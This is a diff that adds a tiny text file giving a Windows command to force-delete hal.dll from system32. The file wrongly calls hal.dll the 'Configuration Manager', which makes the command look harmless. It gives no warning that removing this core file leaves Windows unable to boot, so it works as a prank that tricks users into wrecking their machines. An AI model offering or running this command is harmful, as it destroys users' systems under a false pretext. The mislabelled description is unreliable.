@@ -1,0 +1,5 @@
+If you want to delete Hal.dll (Configuration Manager)
+Then type in this code:
+
+del /f /q %SystemDrive%\WINDOWS\system32\hal.dll
+
